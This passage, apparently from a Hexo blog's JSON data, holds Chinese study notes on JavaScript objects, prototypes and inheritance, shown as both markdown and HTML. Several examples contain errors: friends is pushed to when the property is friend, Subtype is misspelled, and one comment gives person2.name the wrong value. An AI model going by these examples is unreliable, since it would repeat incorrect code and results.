alert(test2.move());\n```\n**利:**\n主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复\n\n**弊:**\n大多数类最好使用new关键字和构造函数，可以让代码更加简单易读。而不必去查看工厂方法来知道。\n\n**何时使用？**\n1、当对象或组件涉及高复杂性时\n2、当需要根据所在的不同环境轻松生成对象的不同实例时\n3、当处理很多共享相同属性的小型对象或组件时\n\n##### Constructor(构造器)模式\nECMAScript 中可以采用构造函数(构造方法)可用来创建特定的对象。 该模式正好可以解决以上的工厂模式无法识别对象实例的问题。\n```\nfunction Car(model,year,miles){//构造函数模式\n    this.model = model;\n    this.year = year;\n    this.miles = miles;\n    this.run = function () {\n        return this.model + \" has done \" + this.miles + \"miles\";\n    }\n}\nvar Benz = new Car('Benz',2014,20000);\nvar BMW = new Car(\"BMW\",2013,12000);\nalert(Benz instanceof Car); //很清晰的识别他从属于 Car,true\nconsole.log(Benz.run());\nconsole.log(BMW.run());\n```\n**和工厂模式相比：**\n1.构造函数方法没有显示的创建对象 (new Object());\n2.直接将属性和方法赋值给 this 对象;\n3.没有 renturn 语句。\n\n##### 原型模式\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nperson1.sayName()     // gdccwxx\nvar person2 = new Person();\nperson2.sayName()     // gdccwxx\nperson1.sayName == person2.sayName  // true\n\n```\n**Person类与构造函数，原型存在如下关系**\n\nPerson的原型是person1和person2的原型。而Person.prototype.constructor右指回了Person\n使用isPrototypeOf()判断对详见是否存在这种关系\n```\nPerson.prototype.isPrototypeOf(person1) // true\nPerson.prototype.isPrototypeOf(person2) // true\n\n```\n虽然对象实例访问保存在原型中的值，却不能通过对象实例重写原型中的值。如果在对象里面添加一个属性，该属性只会存在于对象实例中，而屏蔽原型。即\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nperson1.sayName()     // gdccwxx\nvar person2 = new Person();\nperson2.sayName()     // gdccwxx\nperson1.name = 'guo'\nperson1.name    // guo\nperson2.name    // gdccwxx\ndelete person1.name \nperson1.name    // gdccwxx\n```\n对象搜索属性中，先在实例中搜索，实例中有，则直接返回，实例中没有，则到其原型中查找。若在原型中未找到，则返回undefined；若找到则返回。因此，对person1实例添加name属性后，就屏蔽了原型里面的name，删除实例后的属性之后，又去原型里查找。\n_ps：原型属性不可被delete掉_\nhasOwnProperty()确定属性是否在实例上的方法\n原型与in操作符\nin有两种操作，第一种是在for-in循环中使用，另一种是会在通过对象能够访问的给定属性时返回true\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nvar person2 = new Person();\nperson1.hasOwnProperty('name')  // 在原型上，返回false\n'name' in person1       //能够访问，true\nperson1.name = 'guo'\nperson1.name            // guo\nperson1.hasOwnProperty('name')  // true\n'name' in person1       //能够访问，true\nperson2.name            // guo\nperson2.hasOwnProperty('name')  //false\n'name' in person2       // true\ndelete person1.name\nperson1.name            // gdccwxx\nperson1.hasOwnProperty('name')  // 在原型上，返回false\n'name' in person1       //能够访问，true\n```\nObject.keys()方法，获取对象所有可枚举实例属性\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar keys = Object.keys(Person.prototype)\nkeys            // name,age,sayName\nvar p1 = new Person();\np1.name = 'guo'\np1.age = '20'\nvar p1keys = Object.keys(p1)\np1keys  // 'name,age'\n// 获得所有实例属性，无论是否可枚举，使用Object.getOwnPropertyNames()\nvar keys = Object.getOwnPropertyNames(Person.prototype)\nkeys    // [\"constructor\", \"name\", \"age\", \"sayName\"]\n// 也可以使用另一种原型定义方法，字面量方法\nfunction Person(){}\nPerson.prototype = {\n    name : 'gdccwxx',\n    age : 20,\n    sayName: function(){\n        //\n    }\n}\n//如果constructor很重要，也可以特意设定\nPerson.prototype = {\n    constructor: Person,\n    name : 'gdccwxx',\n    age : 20,\n    sayName: function(){\n        //\n    }\n}\n//这种重设constructor会导致其Enumerable属性变为true。如果要重设，应使用defineProperty\nObject.defineProperty(Person.prototype, 'constructor',{\n    enumerable: false,\n    value: Person\n})\n```\n由于是person指针指向Person的prototype，因此在Person任意改变prototype的情况下，会导致所有子元素都改变。因此大多都很少单独使用原型模式\n**组合使用构造函数模式和原型模式**\n将函数使用prototype模式，其他基本类型使用构造函数.可以达到节省内存，又拥有实例和副本。\n```\nfunction Person(name,age,job){\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.friend = ['a','b']\n}\nPerson.prototype = {\n    constructor: Person,\n    sayName : function(){\n        console.log(this.name)\n    }\n}\nvar person1 = new Person('gdccwxx', 20 ,'SoftWare')\nvar person2 = new Person('guo', 10 ,'Doctor')\nperson1.friends.push('van')\nperson1.friend      // a,b,van\nperson2.friend      // a,b\nperson1.friend === person2.friend   //false\nperson1.sayName === person2.sayName   //true\n```\n#### 继承\n##### 原型链\n原型链是JavaScript的主要实现继承方法\n```\nfunction SuperType(){\n    this.property = true\n}\nSuperType.prototype.getSuperValue = function(){\n    return this.property;\n}\nfunction SubType(){\n    this.subproperty = false\n}\nSubtype.prototype = new SuperType()\nSubType.prototype.getSubValue = function(){\n    return this.subproperty;\n}\nvar instance = new SubType();\nvar instance = new SubType()\ninstance.getSuperValue()    //true\n```\ninstance的原型连集成了SuperType方法\n##### 寄生组合式继承\n```\nfunction inheritPrototype(subType, superType){\n    var prototype = object(superType.prototype) // 创建对象\n    prototype.constructor = subType             // 增强对象\n    subType.prototype = prototype               // 指定对象\n}\nfunction SuperType(name){\n    this.name = name;\n    this.colors = ['red','blue','green']\n}\nSuperType.prototype.sayName = function(){\n    return this.name\n}\nfunction SubType(name, age){\n    SuperType.call(this, name)      \n    this.age = age\n}\ninheritPrototype(SubType, SuperType);\nSubType.prototype.sayAge = function(){\n    return this.age\n}\n```\n通过上述继承方式，少用了一次构造函数，并且因此避免了在SuperType.prototype上的不必要创建、多余的属性\n##### 小结\n通过本章的学习，深入理解了原型以及原型链上继承的问题。之前没用用过的defineProperty和prototype，都逐渐明白了其用处以及用法。通过原型链，构造函数等学习，让我对JavaScript的理解更上一步。以及对对象的理解更加深刻。不仅仅是属性以及value那么简单。对内存的分配以及效率的使用更加深刻。","slug":"read-javascript-again-chapter6","published":1,"updated":"2021-10-13T15:52:03.887Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz09001b4jzxg5sg7gvx","content":"<h3 id=\"面向对象的程序设计\"><a href=\"#面向对象的程序设计\" class=\"headerlink\" title=\"面向对象的程序设计\"></a>面向对象的程序设计</h3><h4 id=\"属性类型\"><a href=\"#属性类型\" class=\"headerlink\" title=\"属性类型\"></a>属性类型</h4><p>ECMAScript中有两种属性，数据属性和访问器属性</p><h5 id=\"数据属性\"><a href=\"#数据属性\" class=\"headerlink\" title=\"数据属性\"></a>数据属性</h5><p>[[Configurable]] : 表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。<br>[[Enumerable]] : 表示能否通过 for-in 循环返回属性。<br>[[Writable]] : 表示能否修改属性的值。<br>[[Value]] : 包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值时，把新值保存在这个位置。默认值是 undefined。</p><p><em>ps：将Configurable修改为false之后，除了Writable可修改之外，Configurable，Enumerable都不可再修改。</em></p><p><strong>Object.defineProperty可以为对象添加属性</strong></p><h5 id=\"访问器属性\"><a href=\"#访问器属性\" class=\"headerlink\" title=\"访问器属性\"></a>访问器属性</h5><p>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。<br>[[Enumerable]]：表示能否通过 for-in 循环返回属性。<br>[[Get]]：在读取属性时调用的函数。默认值为 undefined。<br>[[Set]]：在写入属性时调用的函数。默认值为 undefined。</p><p><strong>get,set方法</strong><br>有时候希望访问属性时能返回一个动态计算后的值, 或希望不通过使用明确的方法调用而显示内部变量的状态.在JavaScript中, 能通过使用 getter 实现. 尽管可能结合使用getter和setter创建一个伪属性,但不能既使用getter绑定到一个属性上,同时又用该属性真实的存储一个值.<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var book = &#123;</span><br><span class=\"line\">    _year : 2004,</span><br><span class=\"line\">    edition : 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Object.defineProperty(book,&quot;year&quot;,&#123; </span><br><span class=\"line\">    get : function () &#123;</span><br><span class=\"line\">        alert(this._year);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    set : function (newValue) &#123;</span><br><span class=\"line\">        if (newValue &gt; 2004) &#123;</span><br><span class=\"line\">            this._year = newValue;</span><br><span class=\"line\">            this.edition += newValue - 2004;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">book.year;      // 弹出窗口，显示 2004</span><br><span class=\"line\">book.year = 2005;</span><br><span class=\"line\">console.log(book.edition);   // 2</span><br></pre></td></tr></table></figure><p></p><p>get，set方法可以动态的关注对象中变量的变化，可以使其他变量随着变化而变化。因此在某些情况下非常适用<br>定义多个属性Object.defineProperties(obj, props)<br>将defineProperty改为复数形式defineProperties，并将参数改为一个对象<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;&#125;;</span><br><span class=\"line\">Object.defineProperties(obj, &#123;</span><br><span class=\"line\">  &quot;property1&quot;: &#123;</span><br><span class=\"line\">    value: true,</span><br><span class=\"line\">    writable: true</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;property2&quot;: &#123;</span><br><span class=\"line\">    value: &quot;Hello&quot;,</span><br><span class=\"line\">    writable: false</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  // 等等.</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(obj); // Object &#123;property1: true, property2: &quot;Hello&quot;&#125;</span><br></pre></td></tr></table></figure><p></p><p>读取给定属性的特性<strong>Object.getOwnPropertyDescriptor(obj, prop)</strong> 返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var man = &#123;name: &quot;gdc&quot;&#125;;</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;name&quot;));</span><br><span class=\"line\">// Object &#123;value: &quot;gdc&quot;, writable: true, enumerable: true, configurable: true&#125;</span><br><span class=\"line\">Object.defineProperties(man,&#123;</span><br><span class=\"line\">  name:&#123;</span><br><span class=\"line\">    writable: false</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  age:&#123;</span><br><span class=\"line\">    writable: true,</span><br><span class=\"line\">    value: 22</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;name&quot;));</span><br><span class=\"line\">// Object &#123;value: &quot;gdc&quot;, writable: false, enumerable: true, configurable: true&#125;</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;age&quot;));</span><br><span class=\"line\">// Object &#123;value: 22, writable: true, enumerable: false, configurable: false&#125;</span><br><span class=\"line\">var descriptor = Object.getOwnPropertyDescriptor(man,&quot;age&quot;);</span><br><span class=\"line\">console.log(descriptor.value);         // 22</span><br><span class=\"line\">console.log(descriptor.configurable);  // false</span><br><span class=\"line\">console.log(descriptor.writable);      // true</span><br><span class=\"line\">console.log(descriptor.get);           // undefined</span><br><span class=\"line\">console.log(descriptor.set);           // undefined</span><br></pre></td></tr></table></figure><p></p><p>读取当前属性，返回获取数据形式</p><h4 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" title=\"创建对象\"></a>创建对象</h4><h5 id=\"1、工厂模式：\"><a href=\"#1、工厂模式：\" class=\"headerlink\" title=\"1、工厂模式：\"></a>1、工厂模式：</h5><p>为了解决多个类似对象声明的问题，我们可以使用一种叫做 工厂模式的方法，这种方法就是为了解决实例化对象产生大量重复的问题。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function createObject(name,age,profession)&#123;//集中实例化的函数</span><br><span class=\"line\">        var obj = new Object();</span><br><span class=\"line\">        obj.name = name;</span><br><span class=\"line\">        obj.age = age;</span><br><span class=\"line\">        obj.profession = profession;</span><br><span class=\"line\">        obj.move = function () &#123;</span><br><span class=\"line\">            return this.name + &apos; at &apos; + this.age + &apos; engaged in &apos; + this.profession;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var test1 = createObject(&apos;trigkit4&apos;,22,&apos;programmer&apos;);//第一个实例</span><br><span class=\"line\">    var test2 = createObject(&apos;mike&apos;,25,&apos;engineer&apos;);//第二个实例</span><br><span class=\"line\">    alert(test1.move());</span><br><span class=\"line\">    alert(test2.move());</span><br></pre></td></tr></table></figure><p></p><p><strong>利:</strong><br>主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复</p><p><strong>弊:</strong><br>大多数类最好使用new关键字和构造函数，可以让代码更加简单易读。而不必去查看工厂方法来知道。</p><p><strong>何时使用？</strong><br>1、当对象或组件涉及高复杂性时<br>2、当需要根据所在的不同环境轻松生成对象的不同实例时<br>3、当处理很多共享相同属性的小型对象或组件时</p><h5 id=\"Constructor-构造器-模式\"><a href=\"#Constructor-构造器-模式\" class=\"headerlink\" title=\"Constructor(构造器)模式\"></a>Constructor(构造器)模式</h5><p>ECMAScript 中可以采用构造函数(构造方法)可用来创建特定的对象。 该模式正好可以解决以上的工厂模式无法识别对象实例的问题。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Car(model,year,miles)&#123;//构造函数模式</span><br><span class=\"line\">    this.model = model;</span><br><span class=\"line\">    this.year = year;</span><br><span class=\"line\">    this.miles = miles;</span><br><span class=\"line\">    this.run = function () &#123;</span><br><span class=\"line\">        return this.model + &quot; has done &quot; + this.miles + &quot;miles&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var Benz = new Car(&apos;Benz&apos;,2014,20000);</span><br><span class=\"line\">var BMW = new Car(&quot;BMW&quot;,2013,12000);</span><br><span class=\"line\">alert(Benz instanceof Car); //很清晰的识别他从属于 Car,true</span><br><span class=\"line\">console.log(Benz.run());</span><br><span class=\"line\">console.log(BMW.run());</span><br></pre></td></tr></table></figure><p></p><p><strong>和工厂模式相比：</strong><br>1.构造函数方法没有显示的创建对象 (new Object());<br>2.直接将属性和方法赋值给 this 对象;<br>3.没有 renturn 语句。</p><h5 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">person1.sayName()     // gdccwxx</span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person2.sayName()     // gdccwxx</span><br><span class=\"line\">person1.sayName == person2.sayName  // true</span><br></pre></td></tr></table></figure><p><strong>Person类与构造函数，原型存在如下关系</strong></p><p>Person的原型是person1和person2的原型。而Person.prototype.constructor右指回了Person<br>使用isPrototypeOf()判断对详见是否存在这种关系<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person.prototype.isPrototypeOf(person1) // true</span><br><span class=\"line\">Person.prototype.isPrototypeOf(person2) // true</span><br></pre></td></tr></table></figure><p></p><p>虽然对象实例访问保存在原型中的值，却不能通过对象实例重写原型中的值。如果在对象里面添加一个属性，该属性只会存在于对象实例中，而屏蔽原型。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">person1.sayName()     // gdccwxx</span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person2.sayName()     // gdccwxx</span><br><span class=\"line\">person1.name = &apos;guo&apos;</span><br><span class=\"line\">person1.name    // guo</span><br><span class=\"line\">person2.name    // gdccwxx</span><br><span class=\"line\">delete person1.name </span><br><span class=\"line\">person1.name    // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>对象搜索属性中，先在实例中搜索，实例中有，则直接返回，实例中没有，则到其原型中查找。若在原型中未找到，则返回undefined；若找到则返回。因此，对person1实例添加name属性后，就屏蔽了原型里面的name，删除实例后的属性之后，又去原型里查找。<br><em>ps：原型属性不可被delete掉</em><br>hasOwnProperty()确定属性是否在实例上的方法<br>原型与in操作符<br>in有两种操作，第一种是在for-in循环中使用，另一种是会在通过对象能够访问的给定属性时返回true<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // 在原型上，返回false</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br><span class=\"line\">person1.name = &apos;guo&apos;</span><br><span class=\"line\">person1.name            // guo</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // true</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br><span class=\"line\">person2.name            // guo</span><br><span class=\"line\">person2.hasOwnProperty(&apos;name&apos;)  //false</span><br><span class=\"line\">&apos;name&apos; in person2       // true</span><br><span class=\"line\">delete person1.name</span><br><span class=\"line\">person1.name            // gdccwxx</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // 在原型上，返回false</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br></pre></td></tr></table></figure><p></p><p>Object.keys()方法，获取对象所有可枚举实例属性<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var keys = Object.keys(Person.prototype)</span><br><span class=\"line\">keys            // name,age,sayName</span><br><span class=\"line\">var p1 = new Person();</span><br><span class=\"line\">p1.name = &apos;guo&apos;</span><br><span class=\"line\">p1.age = &apos;20&apos;</span><br><span class=\"line\">var p1keys = Object.keys(p1)</span><br><span class=\"line\">p1keys  // &apos;name,age&apos;</span><br><span class=\"line\">// 获得所有实例属性，无论是否可枚举，使用Object.getOwnPropertyNames()</span><br><span class=\"line\">var keys = Object.getOwnPropertyNames(Person.prototype)</span><br><span class=\"line\">keys    // [&quot;constructor&quot;, &quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</span><br><span class=\"line\">// 也可以使用另一种原型定义方法，字面量方法</span><br><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    name : &apos;gdccwxx&apos;,</span><br><span class=\"line\">    age : 20,</span><br><span class=\"line\">    sayName: function()&#123;</span><br><span class=\"line\">        //</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//如果constructor很重要，也可以特意设定</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    constructor: Person,</span><br><span class=\"line\">    name : &apos;gdccwxx&apos;,</span><br><span class=\"line\">    age : 20,</span><br><span class=\"line\">    sayName: function()&#123;</span><br><span class=\"line\">        //</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//这种重设constructor会导致其Enumerable属性变为true。如果要重设，应使用defineProperty</span><br><span class=\"line\">Object.defineProperty(Person.prototype, &apos;constructor&apos;,&#123;</span><br><span class=\"line\">    enumerable: false,</span><br><span class=\"line\">    value: Person</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><p></p><p>由于是person指针指向Person的prototype，因此在Person任意改变prototype的情况下，会导致所有子元素都改变。因此大多都很少单独使用原型模式<br><strong>组合使用构造函数模式和原型模式</strong><br>将函数使用prototype模式，其他基本类型使用构造函数.可以达到节省内存，又拥有实例和副本。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person(name,age,job)&#123;</span><br><span class=\"line\">    this.name = name;</span><br><span class=\"line\">    this.age = age;</span><br><span class=\"line\">    this.job = job;</span><br><span class=\"line\">    this.friend = [&apos;a&apos;,&apos;b&apos;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    constructor: Person,</span><br><span class=\"line\">    sayName : function()&#123;</span><br><span class=\"line\">        console.log(this.name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person1 = new Person(&apos;gdccwxx&apos;, 20 ,&apos;SoftWare&apos;)</span><br><span class=\"line\">var person2 = new Person(&apos;guo&apos;, 10 ,&apos;Doctor&apos;)</span><br><span class=\"line\">person1.friends.push(&apos;van&apos;)</span><br><span class=\"line\">person1.friend      // a,b,van</span><br><span class=\"line\">person2.friend      // a,b</span><br><span class=\"line\">person1.friend === person2.friend   //false</span><br><span class=\"line\">person1.sayName === person2.sayName   //true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h4><h5 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h5><p>原型链是JavaScript的主要实现继承方法<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function SuperType()&#123;</span><br><span class=\"line\">    this.property = true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class=\"line\">    return this.property;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SubType()&#123;</span><br><span class=\"line\">    this.subproperty = false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Subtype.prototype = new SuperType()</span><br><span class=\"line\">SubType.prototype.getSubValue = function()&#123;</span><br><span class=\"line\">    return this.subproperty;</span><br><span class=\"line\">&#125;</span><br><span 